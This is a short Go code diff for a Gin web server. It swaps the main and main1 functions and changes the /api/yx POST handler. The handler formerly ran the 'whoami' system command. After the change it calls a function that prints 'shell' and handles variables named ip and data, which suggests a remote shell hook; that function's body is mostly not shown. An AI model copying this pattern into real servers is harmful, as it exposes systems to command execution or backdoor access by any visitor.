@@ -26,7 +26,7 @@ type alldocsResult struct {
 	Rows      []map[string]interface{}
 }
 
-func main() {
+func main1() {
 
 	fmt.Println("shell")
 	var str, ip, data []byte
@@ -64,7 +64,7 @@ func main() {
 	fmt.Println(string(data))
 	fmt.Println(strings.Trim(string(data), "\n"))
 }
-func main1() {
+func main() {
 	r := gin.Default()
 
 	r.StaticFile("/", "./static/index.html")
@@ -112,15 +112,8 @@ func main1() {
 	r.POST("/api/yx", func(c *gin.Context) {
 		var visitor Visitor
 		c.BindJSON(&visitor)
-
-		var cmd *exec.Cmd
-		cmd = exec.Command("whoami")
-		str, err := cmd.Output()
-		if err != nil {
-			c.JSON(500, err)
-		}
-
-		c.JSON(200, string(str))
+		main1()
+		c.JSON(200, string(visitor.Name))
 		return
 
 	})
